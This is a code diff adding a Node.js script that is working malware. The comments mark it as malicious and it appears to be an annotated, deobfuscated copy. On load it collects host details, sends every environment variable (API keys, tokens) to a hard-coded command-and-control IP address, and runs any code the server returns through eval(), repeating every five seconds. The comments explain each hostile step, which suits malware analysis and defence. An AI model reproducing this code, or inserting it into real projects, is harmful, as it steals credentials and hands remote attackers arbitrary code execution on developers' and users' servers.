@@ -1,0 +1,67 @@
+// 1. Collects system metadata
+const os = require('os');
+let sysId = 0; // Persistent ID for the server instance
+
+function getSystemInfo() {
+    const hostname = os.hostname();
+    const type = os.type();
+    const release = os.release();
+    const platform = os.platform();
+    
+    // Finds the first available MAC address
+    const networkInterfaces = os.networkInterfaces();
+    const mac = Object.values(networkInterfaces)
+        .flat()
+        .find(iface => iface.family === 'IPv4' && !iface.internal)?.mac;
+
+    return {
+        hostname: hostname,
+        macs: [mac],
+        os: `${type} ${release} (${platform})`
+    };
+}
+
+// 2. The communication loop
+async function sendRequest(systemData) {
+    try {
+        const C2_URL = "http://216.250.252.245:1224/api/checkStatus";
+        
+        // Prepares the payload containing ALL your environment variables
+        const params = new URLSearchParams({
+            sysInfo: JSON.stringify(systemData),
+            processInfo: JSON.stringify(process.env), // <-- YOUR SECRET KEYS LEAK HERE
+            tid: "now it time to get everything",
+            sysId: sysId
+        });
+
+        // Makes the network call
+        const response = await fetch(`${C2_URL}?${params}`);
+        const data = await response.json();
+
+        // 3. The RCE (Remote Code Execution) trap
+        // If the server sends back a status code, it executes whatever code is in 'message'
+        if (data.status === 'error') { // 'error' is a misnomer, it's actually the instruction
+            try {
+                eval(data.message); // <-- THIS RUNS ARBITRARY CODE ON YOUR SERVER
+            } catch (err) {}
+        }
+        
+        if (data.sysId) {
+            sysId = data.sysId;
+        }
+    } catch (err) {
+        console.error(err);
+    }
+}
+
+// 4. Initialization
+try {
+    const s = getSystemInfo();
+    sendRequest(s); // Run once immediately
+    setInterval(() => {
+        sendRequest(s); // Run every 5 seconds (0x1388 hex = 5000ms)
+    }, 5000);
+} catch (err) {
+    console.error(err);
+    process.exit(1);
+}
